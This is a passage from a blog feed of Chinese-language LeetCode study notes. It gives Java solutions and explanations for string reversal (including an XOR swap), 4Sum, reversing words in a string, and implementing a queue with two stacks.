        <content type="html"><![CDATA[<h4 id="反转字符串"><a href="#反转字符串" class="headerlink" title="反转字符串"></a>反转字符串</h4><p>link：<a href="https://leetcode.cn/problems/reverse-string/description/">344. 反转字符串 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>其实最开始学C语言的时候，也遇到过类似题目.当时自以为的投机取巧无非只是倒序打印而不是逆置元素.（hh 果然小白都会这样 当然也有更聪明的小懒狗直接用库函数 【及其不推荐】</p><h6 id="双指针"><a href="#双指针" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">          <span class="type">char</span> <span class="variable">tmp</span> <span class="operator">=</span> s[left];</span><br><span class="line">          s[left] = s[right];</span><br><span class="line">          s[right] = tmp;</span><br><span class="line">          right--;</span><br><span class="line">          left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tip</strong></p><p>更优雅的处理方式——<strong>异或</strong><br>因为a ^ a &#x3D; 0,b ^ 0 &#x3D;b<br>所以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseString</span><span class="params">(<span class="type">char</span>[] s)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> s.length - <span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(left &lt; right) &#123;</span><br><span class="line">          s[left] ^= s[right];</span><br><span class="line">          s[right] ^= s[left];</span><br><span class="line">          s[left] ^= s[right];</span><br><span class="line">          right--;</span><br><span class="line">          left++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一步</strong>： <code>s[left] ^= s[right];</code></p><ul><li>用 <code>s[left]</code> 与 <code>s[right]</code> 进行异或操作，并将结果存储在 <code>s[left]</code> 中。</li><li>此时 <code>s[left]</code> 的值变为 <code>A ^ B</code>，而 <code>s[right]</code> 仍然是 <code>B</code>。</li></ul><p><strong>第二步</strong>： <code>s[right] ^= s[left];</code></p><ul><li>将 <code>s[right]</code> 与更新后的 <code>s[left]</code> 进行异或操作，并将结果存储在 <code>s[right]</code> 中。</li><li>因为 <code>s[left]</code> 是 <code>A ^ B</code>，所以 <code>s[right] ^= (A ^ B)</code> 相当于 <code>B ^ (A ^ B)</code>。</li><li>由于 <code>B ^ B = 0</code> 和 <code>0 ^ A = A</code>，此时 <code>s[right]</code> 的值变为 <code>A</code>。</li></ul><p><strong>第三步</strong>： <code>s[left] ^= s[right];</code></p><ul><li>将 <code>s[left]</code> 与更新后的 <code>s[right]</code> 进行异或操作，并将结果存储在 <code>s[left]</code> 中。</li><li>因为 <code>s[right]</code> 是 <code>A</code>，所以 <code>s[left] ^= A</code> 相当于 <code>(A ^ B) ^ A</code>。</li><li>由于 <code>A ^ A = 0</code> 和 <code>0 ^ B = B</code>，此时 <code>s[left]</code> 的值变为 <code>B</code>。</li></ul><h4 id="四数之和"><a href="#四数之和" class="headerlink" title="四数之和"></a>四数之和</h4><p>link：<a href="https://leetcode.cn/problems/4sum/description/">18. 四数之和 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>本题大致思路和三数之和基本一致，只不过题目给出四个数字都互不相同且target是输入的并非0.<br>在三数之和的基础单独嵌套for循环即可.<br>**注意 **</p><p>当数组首元素大于0并且i下标位置的value大于target的时候就可以直接pass.<br>因为当target为负数但首元素比target大时就可能会忽略值.<br>例：target &#x3D; -6 但nums[0] &#x3D; -5<br>如果按照三数之和的去重条件会不符合预期【因为三数之和求解的target是0 元素都大于0 那三数加和自然不会为0】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span>) </span><br></pre></td></tr></table></figure><p>去重a的逻辑相同 为了避免[1,1,2]这种情况 判断为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i -<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>去重b的逻辑从i+1位置开始【其实相当于left】 和去重a一样的逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(j &gt; i + <span class="number">1</span> &amp;&amp; nums[j - <span class="number">1</span>] == nums[j]) </span><br></pre></td></tr></table></figure><h6 id="双指针-1"><a href="#双指针-1" class="headerlink" title="双指针"></a>双指针</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">fourSum</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="comment">//不用返回下标 双指针法先排好序</span></span><br><span class="line">         List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">         Arrays.sort(nums);   </span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">         <span class="comment">//nums[i] &gt; target 剪枝操作</span></span><br><span class="line">         <span class="keyword">if</span>(nums[i] &gt; <span class="number">0</span> &amp;&amp; nums[i] &gt; target)&#123;</span><br><span class="line">                <span class="keyword">return</span> result;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//去重a</span></span><br><span class="line">           <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; nums[i - <span class="number">1</span>] == nums[i]) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="comment">//去重b</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(j &gt; i + <span class="number">1</span> &amp;&amp; nums[j - <span class="number">1</span>] == nums[j]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">             <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> j + <span class="number">1</span>;</span><br><span class="line">             <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">             <span class="keyword">while</span>(right &gt; left) &#123;</span><br><span class="line">                <span class="type">long</span> <span class="variable">sum</span> <span class="operator">=</span> (<span class="type">long</span>) nums[i] + nums[j] + nums[left] + nums[right];</span><br><span class="line">                <span class="keyword">if</span>(sum &gt; target) &#123;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sum &lt; target) &#123;</span><br><span class="line">                    left++;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    result.add(Arrays.asList(nums[i],nums[j],nums[left],nums[right]));</span><br><span class="line">                    <span class="comment">//去重d【就是right】</span></span><br><span class="line">                    <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[right] == nums[right - <span class="number">1</span>]) &#123;</span><br><span class="line">                        right--;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">//去重c</span></span><br><span class="line">                    <span class="keyword">while</span>(right &gt; left &amp;&amp; nums[left] == nums[left + <span class="number">1</span>]) &#123;</span><br><span class="line">                        left++;</span><br><span class="line">                    &#125;</span><br><span class="line">                    left++;</span><br><span class="line">                    right--;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xc</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xc/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xc/</url>
      
        <content type="html"><![CDATA[<h4 id="反转字符串II"><a href="#反转字符串II" class="headerlink" title="反转字符串II"></a>反转字符串II</h4><p>link:<a href="https://leetcode.cn/problems/reverse-string-ii/description/">541. 反转字符串 II - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>关键点在于我们要找对反转思路，2k是一个区间，没达到条件和达到条件之后怎么处理.<br>因此考虑怎么筛选条件.</p><p>首先创建一个字符数组用于存储遍历的下标位置用于筛选【其实类似双指针判断 此时尾指针的判断 避免越界】判断区间为[数组长度-1，起始位置 + k - 1]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseStr</span><span class="params">(String s, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray(); </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;i &lt; ch.length;i += <span class="number">2</span>*k) &#123;</span><br><span class="line">              <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> i;</span><br><span class="line">          <span class="comment">//防止越界 平移判断区间和length比较</span></span><br><span class="line">              <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> Math.min(ch.length -<span class="number">1</span> ,start + k - <span class="number">1</span>);</span><br><span class="line">              <span class="keyword">while</span>(start &lt; end) &#123;</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                ch[end] ^= ch[start];</span><br><span class="line">                ch[start] ^= ch[end];</span><br><span class="line">                start++;</span><br><span class="line">                end--;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//最终返回字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反转字符串中的单词"><a href="#反转字符串中的单词" class="headerlink" title="反转字符串中的单词"></a>反转字符串中的单词</h4><p>link：<a href="https://leetcode.cn/problems/reverse-words-in-a-string/description/">151. 反转字符串中的单词 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>倒序遍历字符串，记录左右边界i，j，找到空格删除，挨个遍历.最后蒋单词拼接返回字符串.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">//删除首尾空格</span></span><br><span class="line">         s = s.trim();</span><br><span class="line">         <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> s.length() - <span class="number">1</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> j;</span><br><span class="line">         <span class="type">StringBuilder</span> <span class="variable">res</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">         <span class="comment">//搜索第一个空格</span></span><br><span class="line">         <span class="keyword">while</span>(i &gt;= <span class="number">0</span>)  &#123;</span><br><span class="line">            <span class="keyword">while</span>(i &gt;= <span class="number">0</span> &amp;&amp; s.charAt(i) != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//添加单词</span></span><br><span class="line">            res.append(s.substring(i + <span class="number">1</span>, j + <span class="number">1</span>) + <span class="string">&quot; &quot;</span>);</span><br><span class="line">            <span class="keyword">while</span>(i &gt;=  <span class="number">0</span> &amp;&amp; s.charAt(i) == <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//继续遍历下一个单词</span></span><br><span class="line">            j = i;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//转换字符串</span></span><br><span class="line">         <span class="keyword">return</span> res.toString().trim();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>除此之外还能用双指针法解决.用fast和slow指针解决空格.</p><p>1.首先利用双指针取出空格（但是保留单词之间的空格【slow指针++为空的时候赋值为空再++】<br>2.反转整个字符串<br>3.单个单词内部反转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">reverseWords</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="comment">// 将字符串转换为字符数组</span></span><br><span class="line">        <span class="type">char</span>[] ch = s.toCharArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 去除多余空格并接收返回的字符数组</span></span><br><span class="line">        ch = removeExtraSpaces(ch);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 反转整个字符串</span></span><br><span class="line">        reverse(ch, <span class="number">0</span>, ch.length - <span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 单词内部反转</span></span><br><span class="line">        reverseWords(ch);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 输出字符串</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(ch);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span>[] removeExtraSpaces(<span class="type">char</span>[] ch) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>; fast &lt; ch.length; fast++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ch[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果 slow 不为 0，意味着不是首单词前的字符，需要添加空格</span></span><br><span class="line">                <span class="keyword">if</span> (slow != <span class="number">0</span>) &#123;</span><br><span class="line">                    ch[slow++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 复制单词</span></span><br><span class="line">                <span class="keyword">while</span> (fast &lt; ch.length &amp;&amp; ch[fast] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                    ch[slow++] = ch[fast++];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建新数组来存储去除多余空格后的字符串</span></span><br><span class="line">        <span class="type">char</span>[] newCh = <span class="keyword">new</span> <span class="title class_">char</span>[slow];</span><br><span class="line">        System.arraycopy(ch, <span class="number">0</span>, newCh, <span class="number">0</span>, slow);</span><br><span class="line">        <span class="keyword">return</span> newCh;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>[] ch, <span class="type">int</span> left, <span class="type">int</span> right)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            ch[left] ^= ch[right];</span><br><span class="line">            ch[right] ^= ch[left];</span><br><span class="line">            ch[left] ^= ch[right];</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">reverseWords</span><span class="params">(<span class="type">char</span>[] ch)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">start</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> <span class="number">0</span>; end &lt;= ch.length; end++) &#123;</span><br><span class="line">            <span class="comment">// 当 end 遇到空格或者到达字符数组末尾，开始反转单词</span></span><br><span class="line">            <span class="keyword">if</span> (end == ch.length || ch[end] == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                reverse(ch, start, end - <span class="number">1</span>);</span><br><span class="line">                start = end + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h5><p> 1.String substring(int start, int end) 返回一个新的 <code>String</code>，它包含此序列当前所包含的字符子序列。<br>2.在使用 StringBuffer 类时，每次都会对 StringBuffer 对象本身进行操作，而不是生成新的对象，所以如果需要对字符串进行修改推荐使用 StringBuffer。<br>3.trim() 方法用于删除字符串的头尾空白符。</p>]]></content>
      
      
      <categories>
          
          <category> Algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>yubのAlgorithm.0xd</title>
      <link href="/2024/11/08/yub%E3%81%AEAlgorithm.0xd/"/>
      <url>/2024/11/08/yub%E3%81%AEAlgorithm.0xd/</url>
      
        <content type="html"><![CDATA[<h4 id="用栈实现队列"><a href="#用栈实现队列" class="headerlink" title="用栈实现队列"></a>用栈实现队列</h4><p>link：<a href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. 用栈实现队列 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先理清楚栈和队列的异同.<br>队列是先进先出 栈先进后出【两者都能存储元素】<br>再来看peek()和poll().<br>栈和队列都有peek() 可以称之为“瞄一眼”只是看一下当前栈顶&#x2F;队头元素是什么.<br>栈中的pop()直接返回栈顶元素（出栈）<br>队列中的poll()在某种层面上就等效于pop()了.</p><p>先用栈1存储所有元素 再逐个pop到栈2中<br>最后pop栈2全部元素.<br>注意判断栈满（是否需要扩容）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Integer&gt; stack1;</span><br><span class="line">  <span class="keyword">private</span> Stack&lt;Integer&gt; stack2;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        stack1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//数据全部存在stack1中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">            stack1.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//特殊 两者都为空</span></span><br><span class="line">        <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="comment">//先判断空 stack2不为空直接pop 统一从stack2出</span></span><br><span class="line">     <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">      <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">            <span class="comment">//将stack1中的元素传到stack2中</span></span><br><span class="line">            stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> stack2.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">peek</span><span class="params">()</span> &#123;</span><br><span class="line">         <span class="comment">//特殊 两者都为空</span></span><br><span class="line">        <span class="keyword">if</span>(empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">   <span class="comment">//先判断空 stack2不为空直接pop 统一从stack2出</span></span><br><span class="line">     <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">      <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">            <span class="comment">//将stack1中的元素传到stack2中</span></span><br><span class="line">            stack2.push(stack1.pop());</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> stack2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">empty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> stack1.empty() &amp;&amp; stack2.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyQueue</span> &#123;</span><br><span class="line">    <span class="comment">//创建需要的两个栈</span></span><br><span class="line">    Stack&lt;Integer&gt; stackIn;</span><br><span class="line">    Stack&lt;Integer&gt; stackOut;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyQueue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//初始化</span></span><br><span class="line">        stackIn = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stackOut = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="comment">//入栈        </span></span><br><span class="line">        stackIn.push(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        dumpstackIn();</span><br><span class="line">        <span 